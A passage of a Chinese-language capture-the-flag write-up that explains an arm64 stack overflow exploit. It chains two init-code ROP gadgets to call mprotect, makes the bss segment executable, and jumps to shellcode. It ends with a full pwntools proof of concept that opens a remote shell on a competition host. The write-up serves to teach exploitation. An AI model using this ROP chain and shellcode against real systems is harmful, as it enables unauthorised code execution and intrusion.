    #define PROT_WRITE  0x2     /* Page can be written.  */
    #define PROT_EXEC   0x4     /* Page can be executed.  */
    #define PROT_NONE   0x0     /* Page can not be accessed.  */
通过前面的了解我们知道 `arm64` 的 第三个参数放在 `x2` 寄存器里面，所以我现在就是要去找可以修改 `x2` 或者 `W2` 的
`gadget`.
通过在 `gadget` 里面搜索 ，发现了两个可以结合使用的 `gadget`
    0x4008AC : ldr x3, [x21, x19, lsl #3] ; mov x2, x22 ; mov x1, x23 ; mov w0, w24 ; add x19, x19, #1 ; blr x3
    0x4008CC ： ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
  * 第一个 `gadget` 使用 `x22`, `x23`, `x24` 寄存器的值设置了 `x2`, `x1` , `w0` 的值 , 这正好设置了函数调用的三个参数。然后会跳转到 `x3`. 而 `x3` 是从 `x21 + x19 gadget 2
    payload += p64(0x0)  # x19
    payload += p64(0x0)  # x20
    payload += p64(0x0411068)  # x21---> input
    payload += p64(0x7)  # x22---> mprotect , rwx
    payload += p64(0x1000)  # x23---> mprotect , size
    payload += p64(0x411000)  # x24---> mprotect , address
    payload += p64(0x0411068 + 0x10)
    payload += p64(0x0411068 + 0x10) # ret to shellcode
    payload += cyclic(0x100)
首先使用 `0x4008CC` 处的 `gadget` 设置寄存器的值， 执行完后各个寄存器的值为
    x30 = 0x4008AC   --> 即第二段 gadget 的地址， ret指令时会 跳转过去，执行第二段 gadget
    x21 = 0x0411068  --> 程序开头让我们输入的name存放的位置， 用于第二段 gadget 设置 x3
    x19 = 0
    x22 = 7      mprotect 的第3个参数， 表示  rwx
    x23 = 0x1000 mprotect 的第2个参数
    x24 = 0x411068 mprotect 的第1个参数
此时栈的布局为
    p64(0x0411068 + 0x10)
    p64(0x0411068 + 0x10) # ret to shellcode
    cyclic(0x100)
然后执行第二段 `gadget（0x4008AC）`
首先
    ldr x3, [x21, x19, lsl #3]
我们在第一段 `gadget` 时设置了 `x21` 为 `name` 的地址， `x19` 为 `0`。 所以 `x3` 为 `name` 开始的 `8`
个字节。
然后设置 `x0` ~`x2` 的值。最后会 跳转到 `x3` 处。 此时参数已经设置好，我们在 发送 `name` 时把 开头 8 字节 设置为 调用
`mprotect` 的地址，就可以调用 `mprotect` 把 `bss` 段设置为 可执行了。
    p.recvuntil("Name:")
    payload = p64(0x4007E0) # 调用 mprotect
    payload += p64(0)
    payload += shellcode  # shellcode 
    p.send(payload)
**调用`mprotect`**
我这里选择了 `0x4007E0`, 因为这里执行完后就会 从栈上取地址返回， 我们可以再次控制 `pc`
    .text:00000000004007E8                 LDP             X29, X30, [SP+var_s0],#0x10
    .text:00000000004007EC                 RET
执行到 `04007E8`时的 栈
    p64(0x0411068 + 0x10)
    p64(0x0411068 + 0x10) # ret to shellcode
    cyclic(0x100)
**跳转到 shellcode**
然后就会跳转到 `0x0411068 + 0x10` 也就是我们 `shellcode` 的位置。
**执行shellcode**
最后发现这两段 `gadget` 位于 程序初始化函数的那一部分， 应该以后可以作为通用 `gadget` .
**poc**
    from pwn import *
    from time import sleep
    elf = ELF("./pwn")
    context.binary = elf
    context.log_level = "debug"
    shellcode = asm(shellcraft.aarch64.sh())
    p = remote("106.75.126.171", 33865)
    # p = remote("127.0.0.1", 10002)
    # pause()
    p.recvuntil("Name:")
    payload = p64(0x4007E0)
    payload += p64(0)
    payload += shellcode
    p.send(payload)
    payload = cyclic(72)
    payload += p64(0x4008CC) # pc, gadget 1
    payload += p64(0x0)  # x29
    payload += p64(0x4008AC)  # x30, ret address ----> gadget 2
    payload += p64(0x0)  # x19
    payload += p64(0x0)  # x20
    payload += p64(0x0411068)  # x21---> input
    payload += p64(0x7)  # x22---> mprotect , rwx
    payload += p64(0x1000)  # x23---> mprotect , size
    payload += p64(0x411000)  # x24---> mprotect , address
    payload += p64(0x0411068 + 0x10)
    payload += p64(0x0411068 + 0x10) # ret to shellcode
    payload += cyclic(0x100)
    sleep(0.5)
    p.sendline(payload)
    p.interactive()
# 总结
通过 搭建 `arm64` 程序调试环境，也明白其他架构调试环境搭建的方式
    apt 安装相应的动态库，然后使用 qemu 执行， 使用 socat 起服务，方便调试
**参考**
    https://peterpan980927.cn/2018/01/27/ARM64%E6%B1%87%E7%BC%96/
    http://people.seas.harvard.edu/~apw/sreplay/src/linux/mmap.c